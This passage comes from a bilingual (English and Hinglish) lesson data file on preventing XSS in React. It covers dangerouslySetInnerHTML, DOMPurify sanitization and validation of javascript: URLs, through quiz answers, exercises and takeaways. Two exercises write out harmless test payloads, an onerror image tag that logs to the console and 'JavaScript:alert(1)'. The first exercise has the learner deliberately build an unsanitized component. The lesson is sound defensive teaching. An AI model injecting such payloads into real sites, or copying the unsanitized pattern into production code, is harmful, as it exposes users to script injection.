a different reason, correctly guaranteed that content\'s safety beforehand.',
        aHi: 'Backend validation sach mein khatra kam karta hai, par ise EKMATRA safeguard ki tarah bharosa karna ek majboot, aksar na-kahi gayi dhaarna maangta hai: ki har akeli string jo kabhi is khaas rendering location tak pahunch sakti hai, bina apvaad, pehle se us bilkul validation step se guzar chuki hai, sahi tarike se, har baar. Kisi bhi asli, vikasit ho rahi application mein, ye dhaarna kai concrete tareekon se fragile hai. Ek alag API endpoint ya code path usi underlying field mein likh sakta hai us validation logic se guzre bina jise developer safety ke baare mein soch rahe waqt maan raha hai. Ek validation rule introduce ya tight kiye jaane se pehle pehle se store data hamesha ke liye apne asli, na-validate-hue roop mein rehta hai jab tak ek alag migration khaas taur par ise dobara process na kare. Validation logic mein khud ek bhavishya ka badlaav, ya ek refactor ke dauraan introduce hui ek bug, chupke se ek check ko kamzor ya bypass kar sakti hai jo pehle bharosemand hoti thi, rendering component ke baare mein kuch bhi ye darsaane ke liye badle bina ki jis guarantee par ye implicitly nirbhar tha ab wo tikti nahi. Us point par turant sanitize karna jahan ek string asal mein HTML ki tarah render hone waali hai in maanytaon ki poori chain ko hataata hai: rendering code khud ko seedhe surakshit karta hai, us asli content ke aadhaar par jise ye dikhaane waala hai, ye maanne ke bajaye ki system ka koi doosra hissa, sambhaavit roop se ek alag vyakti dwara ek alag waqt par ek alag wajah se likha gaya, us content ki suraksha ki pehle se sahi tarike se zamanat de chuka hai.',
      },
      {
        q: 'Why does an unsanitized javascript: URL in an href attribute represent a genuinely separate XSS vector from dangerouslySetInnerHTML, even though both are examples of cross-site scripting?',
        qHi: 'Ek \`href\` attribute mein ek na-sanitize-hua \`javascript:\` URL \`dangerouslySetInnerHTML\` se ek sach mein alag XSS vector kyun darsata hai, chahe dono cross-site scripting ke misalein hon?',
        a: 'dangerouslySetInnerHTML causes JavaScript to execute by directly parsing a string as HTML markup, where an attribute like onerror or onclick embedded in that markup runs as soon as the corresponding DOM element triggers that event, entirely independent of any specific user action like a click. A javascript: URL rendered into a normal href attribute is a completely different mechanism: the href attribute itself is set through entirely ordinary, safe means (React\'s standard attribute handling, not dangerouslySetInnerHTML at all), and nothing executes automatically merely by rendering the link. The vulnerability instead depends on a user actually clicking that specific link — when a browser navigates to a URL beginning with the javascript: scheme, rather than treating it as a normal address to load, it directly executes the remainder of the URL as JavaScript code in the context of the current page. This means the exact same defensive technique that correctly protects against the dangerouslySetInnerHTML vector (sanitizing HTML content with a library like DOMPurify) does nothing at all to protect against this separate vector, since the vulnerable value here is never inserted as HTML in the first place — it is a plain string being used as a URL. Protecting against this requires an entirely different, specific check: validating that a user-supplied value intended to be used as a link\'s destination actually uses a safe protocol (http: or https:) before it is ever rendered into an href, which is a distinct piece of defensive code from HTML sanitization, addressing a categorically different way user-controlled content can end up executing.',
        aHi: '\`dangerouslySetInnerHTML\` ek string ko seedhe HTML markup ki tarah parse karke JavaScript chalwaata hai, jahan us markup mein embed \`onerror\` ya \`onclick\` jaisa ek attribute corresponding DOM element us event ko trigger karte hi chalta hai, kisi bhi khaas user action jaise click se poori tarah swatantra. Ek aam \`href\` attribute mein render hui ek \`javascript:\` URL ek poori tarah alag mechanism hai: \`href\` attribute khud poori tarah aam, surakshit tareekon se set hota hai (React ka standard attribute handling, \`dangerouslySetInnerHTML\` bilkul nahi), aur sirf link render karne se kuch bhi automatically chalta hi nahi. Vulnerability iske bajaye is baat par nirbhar hai ki ek user asal mein us khaas link ko click kare — jab ek browser \`javascript:\` scheme se shuru hone waale ek URL par navigate karta hai, ise load karne ke liye ek normal address ki tarah treat karne ke bajaye, ye URL ke baaki hisse ko current page ke context mein seedhe JavaScript code ki tarah execute karta hai. Iska matlab hai wahi defensive technique jo \`dangerouslySetInnerHTML\` vector ke khilaaf sahi tarike se surakshit karti hai (DOMPurify jaisi library se HTML content sanitize karna) is alag vector ke khilaaf bilkul kuch nahi karti, kyunki yahaan vulnerable value pehli jagah HTML ki tarah daali hi nahi jaati — ye ek saadha string hai jo ek URL ki tarah istemal ho rahi hai. Iske khilaaf surakshit hone ke liye ek poori tarah alag, khaas check chahiye: verify karna ki ek user-diya value jise ek link ki destination ki tarah istemal karne ka iraada hai asal mein ek surakshit protocol (\`http:\` ya \`https:\`) istemal karti hai isse pehle ki ye kabhi ek \`href\` mein render ho, jo HTML sanitization se ek alag defensive code ka tukda hai, ek categorically alag tarika sambodhit karte hue jismein user-niyantrit content aakhirkaar chal sakti hai.',
      },
    ],

    exercises: [
      {
        task: 'Build the broken Comment component using dangerouslySetInnerHTML with no sanitization. Submit a comment containing an <img src="x" onerror="console.log(\'XSS ran\')"> and confirm the console message appears when the comment renders.',
        taskHi: 'Koi sanitization bina \`dangerouslySetInnerHTML\` istemal karta toota \`Comment\` component banao. Ek comment submit karo jismein \`<img src="x" onerror="console.log(\'XSS ran\')">\` ho aur confirm karo ki console message dikhta hai jab comment render hota hai.',
        hint: 'Use console.log instead of anything that actually reaches out to a real server, since this exercise is meant to demonstrate the vulnerability safely in a local sandbox.',
        hintHi: 'Kisi bhi cheez ke bajaye jo asal mein ek asli server tak pahunchti hai \`console.log\` istemal karo, kyunki ye exercise ek local sandbox mein surakshit taur par vulnerability dikhaane ke liye hai.',
      },
      {
        task: 'Install dompurify and fix the component by sanitizing comment.text before rendering it. Resubmit the same malicious comment and confirm the console.log no longer fires.',
        taskHi: '\`dompurify\` install karo aur \`comment.text\` ko render karne se pehle sanitize karke component theek karo. Wahi malicious comment dobara submit karo aur confirm karo ki \`console.log\` ab nahi chalta.',
        hint: 'Log the output of DOMPurify.sanitize(maliciousInput) directly to see exactly which part of the malicious string was removed.',
        hintHi: '\`DOMPurify.sanitize(maliciousInput)\` ka output seedhe log karo ye dekhne ke liye ki malicious string ka bilkul kaunsa hissa hataaya gaya.',
      },
      {
        task: 'Build the isSafeUrl check from this lesson\'s third example, and test it against a genuinely safe URL, a javascript: URL, and a malformed string that is not a URL at all, confirming each is handled correctly.',
        taskHi: 'Is lesson ke teesre example ka \`isSafeUrl\` check banao, aur ise ek sach mein surakshit URL, ek \`javascript:\` URL, aur ek malformed string jo bilkul URL hi nahi hai ke khilaaf test karo, confirm karte hue ki har ek sahi tarike se handle hota hai.',
        hint: 'Try a URL with unusual capitalization like "JavaScript:alert(1)" to confirm the check is not simply doing a case-sensitive string comparison.',
        hintHi: '"JavaScript:alert(1)" jaisi asaadhaaran capitalization wale URL ki koshish karo ye confirm karne ke liye ki check sirf ek case-sensitive string comparison nahi kar raha.',
      },
    ],

    keyTakeaways: [
      'Ordinary JSX rendering ({comment.text}) always escapes its content and displays it as plain text, making it inherently safe regardless of what the string contains.',
      'dangerouslySetInnerHTML deliberately bypasses that escaping and inserts a string as real, parsed HTML — its name is an explicit, built-in warning that this specific API opts out of React\'s default protection.',
      'A malicious payload commonly relies on an event-handler attribute (onerror, onclick) rather than a literal <script> tag, since script tags inserted via innerHTML do not execute, but event handlers on other elements do.',
      'DOMPurify.sanitize should be called on any HTML string immediately before it is passed to dangerouslySetInnerHTML, stripping executable content while preserving genuinely safe formatting markup.',
      'Sanitizing at the point of rendering matters even when backend validation exists, since a different code path, an older unvalidated record, or a future change to validation logic can all silently produce an unsanitized string reaching this point.',
      'dangerouslySetInnerHTML is the most common XSS vector in React but not the only one — a user-controlled javascript: URL rendered into a plain href requires a separate, protocol-specific check to prevent.',
    ],
    keyTakeawaysHi: [
      'Aam JSX rendering (\`{comment.text}\`) hamesha apni content escape karti hai aur ise plain text ki tarah dikhaati hai, ise buniyaadi taur par surakshit banaate hue string mein kuch bhi ho.',
      '\`dangerouslySetInnerHTML\` jaan-boojhkar us escaping ko bypass karta hai aur ek string ko asli, parsed HTML ki tarah daalta hai — iska naam ek explicit, built-in chetaavni hai ki ye khaas API React ke default protection se opt-out karta hai.',
      'Ek malicious payload aam taur par ek event-handler attribute (\`onerror\`, \`onclick\`) par nirbhar karta hai ek literal \`<script>\` tag ke bajaye, kyunki innerHTML se daale \`script\` tags execute nahi hote, par doosre elements par event handlers hote hain.',
      '\`DOMPurify.sanitize\` ko kisi bhi HTML string par bulaana chahiye isse pehle ki ye \`dangerouslySetInnerHTML\` ko diya jaaye, chalti content hataate hue jabki sach mein surakshit formatting markup ko rakhte hue.',
      'Rendering ke point par sanitize karna maayne rakhta hai chahe backend validation maujood ho, kyunki ek alag code path, ek purana na-validate-hua record, ya validation logic mein ek bhavishya ka badlaav sab chupke se ek na-sanitize-hui string is point tak pahunchaa sakte hain.',
      '\`dangerouslySetInnerHTML\` React mein sabse aam XSS vector hai par ekmatra nahi — ek plain \`href\` mein render hui ek user-niyantrit \`javascript:\` URL ko rokne ke liye ek alag, protocol-khaas check chahiye.',
    ],
  },
];
